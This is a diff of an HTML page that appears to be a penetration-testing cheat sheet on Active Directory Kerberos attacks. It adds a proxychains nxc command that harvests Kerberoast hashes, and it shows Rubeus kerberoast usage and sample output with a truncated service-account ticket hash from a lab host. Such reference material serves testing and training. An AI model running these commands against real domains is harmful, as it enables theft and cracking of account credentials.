@@ -332,7 +332,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 </style>
   <h3 id="as_rep-roasting">AS_REP Roasting</h3>
 <p>
-<button data-tabset="set1" data-tabcontent="tab1" class="active">Impacket</button>
+<button data-tabset="set1" data-tabcontent="tab1" >Impacket</button>
 
 <button data-tabset="set1" data-tabcontent="tab2" >nxc</button>
 
@@ -365,7 +365,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 <hr>
 <h3 id="kerberoasting-from-linux">Kerberoasting (From Linux)</h3>
 <p>
-<button data-tabset="set2" data-tabcontent="tab1" class="active">Impacket</button>
+<button data-tabset="set2" data-tabcontent="tab1" >Impacket</button>
 
 <button data-tabset="set2" data-tabcontent="tab2" >nxc</button>
 
@@ -402,10 +402,12 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">LDAPS       10.10.11.168    636    DC1.scrm.local   [*] Total of records returned 2
 </span></span></span><span class="line"><span class="cl"><span class="go">LDAPS       10.10.11.168    636    DC1.scrm.local   sAMAccountName: sqlsvc memberOf:  pwdLastSet: 2021-11-04 00:32:02.351452 lastLogon:2024-09-24 15:53:26.496449
 </span></span></span><span class="line"><span class="cl"><span class="go">LDAPS       10.10.11.168    636    DC1.scrm.local   $krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$335aeba3b ...[SNIP]... 9718487474
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With socks5 proxy
+</span></span><span class="line"><span class="cl"><span class="go">proxychains4 -q nxc ldap &lt;DC_IP&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; -k --kerberoasting kerberoast_hashes.txt --dns-tcp --dns-server &lt;DC_IP&gt;
 </span></span></span></code></pre></div></div></p>
 <h3 id="kerberoasting-from-windows">Kerberoasting (From Windows)</h3>
 <p>
-<button data-tabset="set3" data-tabcontent="tab1" class="active">rubeus</button>
+<button data-tabset="set3" data-tabcontent="tab1" >rubeus</button>
 
 <div class="tabcontent" data-tabset="set3" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe kerberoast /creduser:&lt;DOMAIN&gt;\&lt;USER&gt; /credpassword:&#39;&lt;PASSWORD&gt;&#39;
 </span></span></span></code></pre></div></div></p>
